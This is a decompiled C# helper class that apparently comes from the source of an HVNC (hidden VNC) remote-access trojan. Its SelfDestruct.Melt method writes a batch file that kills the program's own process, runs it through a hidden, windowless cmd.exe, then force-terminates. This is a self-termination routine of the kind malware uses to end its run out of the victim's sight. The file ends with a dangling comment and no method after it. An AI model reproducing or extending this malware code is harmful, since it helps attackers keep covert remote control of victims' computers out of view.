using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000E0 RID: 224
	internal sealed class SelfDestruct
	{
		// Token: 0x060008E0 RID: 2272 RVA: 0x00060890 File Offset: 0x0005EA90
		public static void Melt()
		{
			string text = Path.GetTempFileName() + ".bat";
			int id = Process.GetCurrentProcess().Id;
			using (StreamWriter streamWriter = File.AppendText(text))
			{
				streamWriter.WriteLine("chcp 65001");
				streamWriter.WriteLine("TaskKill /F /IM " + id);
				streamWriter.WriteLine("Timeout /T 2 /Nobreak");
			}
			Logging.Log();
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/C " + text,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			});
			Thread.Sleep(5000);
			Environment.FailFast(null);
		}

		// Token: 0x060008E1 RID: 2273 RVA: 0x00006F52 File Offset: 0x00005152
    }
}
